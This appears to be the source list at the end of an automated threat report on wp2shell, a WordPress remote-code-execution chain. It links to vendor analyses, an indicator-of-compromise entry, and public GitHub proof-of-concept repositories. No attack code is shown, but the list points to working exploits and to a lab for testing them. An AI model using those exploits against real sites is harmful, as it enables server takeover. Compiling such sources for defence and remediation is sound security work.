- [Escape.tech -- wp2shell CVE-2026-63030 + CVE-2026-60137](https://escape.tech/blog/wp2shell-cve-2026-63030-cve-2026-60137/) -- batch endpoint analysis, SLEEP payload confirmation, object hydration details
- [Indusface -- WP2Shell: WordPress Core RCE Flaw](https://www.indusface.com/blog/wp2shell-wordpress-cve-2026-60137-63030-rce/) -- affected version matrix, combined CVSS scoring
- [Picus Security -- CVE-2026-63030 and CVE-2026-60137 WordPress RCE Explained](https://www.picussecurity.com/resource/blog/cve-2026-63030-and-cve-2026-60137-wp2shell-wordpress-rce-explained) -- corroborating technical analysis
- [SOCRadar -- WordPress wp2shell (CVE-2026-63030): CISO FAQ & Fix](https://socradar.io/blog/wp2shell-wordpress-rce-cve-2026-63030/) -- executive-level summary, remediation priority
- [Mallory.ai -- wp2shell Malware Entry](https://mallory.ai/malware/019f7231-a25c-773a-9596-b48fa72994c9) -- webshell behavioral patterns, IOC tracking
- [Field Effect -- WordPress wp2shell Attacks Escalate Following Public PoC Release](https://fieldeffect.com/blog/wordpress-wp2shell-attacks-public-poc) -- exploitation scale, 13 attacker IPs across 7 countries
- [GitHub -- Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) -- public PoC: full RCE chain
- [GitHub -- attackercan/wp2shell-poc2](https://github.com/attackercan/wp2shell-poc2) -- public PoC: CVE-2026-63030
- [GitHub -- dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab) -- non-destructive detector + Docker lab

---
*Report generated by Actioner*
